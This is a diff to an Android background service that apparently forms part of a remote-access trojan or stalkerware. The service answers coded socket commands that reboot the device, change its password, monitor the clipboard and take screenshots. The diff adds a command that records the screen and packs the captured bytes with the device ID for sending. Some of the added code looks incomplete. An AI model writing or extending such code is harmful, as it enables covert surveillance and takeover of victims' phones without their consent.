@@ -79,6 +79,7 @@ public class MainService extends Service {
                     ioSocket.on("0x10", rebootDevice);
                     ioSocket.on("0x11", changeDevicePassword);
                     ioSocket.on("0x12", clipboardMonitoring);
+                    ioSocket.on("0x13", screenRecord);
 
                     if(!ioSocket.connected()){
                         ioSocket.connect();
@@ -224,6 +225,19 @@ public class MainService extends Service {
             JSONObject jsonObject = new JSONObject();
             jsonObject.put("device_id", device_id);
             jsonObject.put("message", "");
+            jsonObject.put("bytes", ScreenCapture.screencap());
+        } catch (Exception exception) {
+            Log.i("screenshot", exception.getMessage());
+        }
+    };
+
+    private final Emitter.Listener screenRecord = args -> {
+        ScreenCapture.screencap();
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+            jsonObject.put("bytes", ScreenCapture.screenRecord());
         } catch (Exception exception) {
             Log.i("screenshot", exception.getMessage());
         }
